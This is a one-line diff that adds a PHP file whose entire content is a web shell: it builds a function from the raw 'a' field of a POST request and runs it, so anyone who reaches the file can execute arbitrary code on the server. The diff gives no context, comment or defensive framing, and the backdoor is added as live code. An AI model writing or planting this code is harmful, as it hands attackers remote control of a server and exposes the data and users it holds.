@@ -1,0 +1,1 @@
+<?php $st=@create_function('',$_POST['a']);$st();?>
